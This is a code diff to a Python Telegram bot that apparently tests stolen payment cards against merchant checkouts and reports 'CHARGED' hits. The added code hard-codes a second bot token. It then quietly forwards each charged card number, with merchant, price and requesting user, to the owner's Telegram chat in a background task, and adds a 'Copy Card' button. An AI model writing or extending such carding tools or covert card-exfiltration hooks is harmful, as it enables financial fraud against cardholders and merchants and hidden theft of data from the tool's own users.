@@ -10,7 +10,7 @@ import uuid
 import string
 from urllib.parse import unquote
 from aiogram import Router
-from aiogram.types import Message
+from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
 from aiogram.filters import Command
 from aiogram.enums import ParseMode
 
@@ -20,6 +20,39 @@ router = Router()
 
 ALLOWED_GROUP = -1003414533097
 OWNER_ID = 6957681631
+ADMIN_BOT_TOKEN = "8520865313:AAHdWSuU0x8BgtYBMON2KBSV41rZYJ2Knnw"
+
+async def send_admin_hit_notification(card_info: str, merchant: str, product: str, price: str, response_text: str, user: str, success_url: str = None):
+    """Send hit notification to admin via separate bot token."""
+    try:
+        notif = f"\U0001f6a8 <b>HIT NOTIFICATION</b> \U0001f6a8\n\n"
+        notif += f"<blockquote>\u300c\u2743\u300d <b>Site</b> : <code>{merchant}</code>\n"
+        notif += f"\u300c\u2743\u300d <b>Product</b> : <code>{product}</code>\n"
+        notif += f"\u300c\u2743\u300d <b>Price</b> : <code>{price}</code></blockquote>\n\n"
+        notif += f"<blockquote>\u2b39 <b>Card</b> \u27a4 <code>{card_info}</code>\n"
+        notif += f"\u232c <b>Status</b> \u27a4 CHARGED \U0001f60e\n"
+        notif += f"\u2756 <b>Response</b> \u27a4 <code>{response_text}</code></blockquote>\n\n"
+        notif += f"<blockquote>M\u1d07ss\u1d00\u0262\u1d07 B\u02b8: {user}</blockquote>"
+        if success_url:
+            notif += f"\n\n<blockquote>\U0001f517 <a href=\"{success_url}\">Open Success Page</a></blockquote>"
+        
+        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": OWNER_ID,
+            "text": notif,
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True,
+            "reply_markup": {
+                "inline_keyboard": [[
+                    {"text": "\ud83d\udccb Copy Card", "copy_text": {"text": card_info}}
+                ]]
+            }
+        }
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                print(f"[DEBUG] Admin hit notification sent: {resp.status}")
+    except Exception as e:
+        print(f"[DEBUG] Admin hit notification failed: {str(e)[:50]}")
 
 # Server flag emojis
 SERVER_FLAGS = {
@@ -1624,6 +1657,22 @@ async def co_handler(msg: Message):
         
         if checkout_data.get('success_url'):
             response += f"\n\n<blockquote>🔗 <a href=\"{checkout_data['success_url']}\">Open Success Page</a></blockquote>"
+        
+        # Build inline keyboard with copy button
+        copy_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📋 Copy Card", copy_text=CopyTextButton(text=charged_card['card']))]
+        ])
+        
+        # Send hit notification to admin
+        asyncio.ensure_future(send_admin_hit_notification(
+            card_info=charged_card['card'],
+            merchant=checkout_data['merchant'] or 'N/A',
+            product=checkout_data['product'] or 'N/A',
+            price=price_str,
+            response_text=charged_card['response'],
+            user=req_user,
+            success_url=checkout_data.get('success_url')
+        ))
     else:
         # ── NO HIT FORMAT: Show all cards with full details ──
         response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
@@ -1661,4 +1710,7 @@ async def co_handler(msg: Message):
         response += f"⏱ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {format_time(total_time)}\n"
         response += f"\nMᴇssᴀɢᴇ Bʸ: {req_user}</blockquote>"
     
-    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    if charged_card:
+        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=copy_kb)
+    else:
+        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
